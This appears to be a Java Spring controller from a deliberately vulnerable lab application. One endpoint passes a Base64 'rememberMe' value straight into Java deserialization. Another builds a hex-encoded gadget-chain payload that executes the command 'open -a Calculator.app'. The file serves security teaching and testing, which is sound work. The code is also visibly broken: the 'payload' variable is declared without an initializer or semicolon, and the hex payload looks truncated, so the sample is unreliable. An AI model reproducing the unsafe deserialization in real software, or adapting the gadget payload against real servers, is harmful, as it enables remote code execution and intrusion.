package org.javaweb.vuln.controller;

import org.apache.commons.codec.binary.Base64;
import org.springframework.web.bind.annotation.*;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.LinkedHashMap;
import java.util.Map;

import static ch.qos.logback.core.encoder.ByteArrayUtil.hexStringToByteArray;
import static ch.qos.logback.core.encoder.ByteArrayUtil.toHexString;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@RequestMapping("/Deserialization/")
public class DeserializationController {

	@PostMapping(value = "/readObject.do", consumes = APPLICATION_JSON_VALUE)
	public Map<String, Object> readObject(@RequestBody Map<String, Object> map) throws Exception {
		Map<String, Object>  data       = new LinkedHashMap<String, Object>();
		String               rememberMe = (String) map.get("rememberMe");
		byte[]               bytes      = Base64.decodeBase64(rememberMe);
		ByteArrayInputStream bais       = new ByteArrayInputStream(bytes);
		ObjectInputStream    bis        = new ObjectInputStream(bais);

		bis.readObject();

		return data;
	}

	@GetMapping("/readObject.do")
	public Map<String, Object> readObject() throws Exception {
		Map<String, Object> data = new LinkedHashMap<String, Object>();

		String command = "open -a Calculator.app";

		String payload
		payload += String.format("%4s", Integer.toHexString(command.length())).replace(' ', '0');
		payload += toHexString(command.getBytes());
		payload += "740004657865637571007E001B0000000171007E00207371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878";

		ByteArrayInputStream bais = new ByteArrayInputStream(hexStringToByteArray(payload));
		ObjectInputStream    bis  = new ObjectInputStream(bais);

		Object obj = bis.readObject();

		data.put("data", obj);
		return data;
	}

}
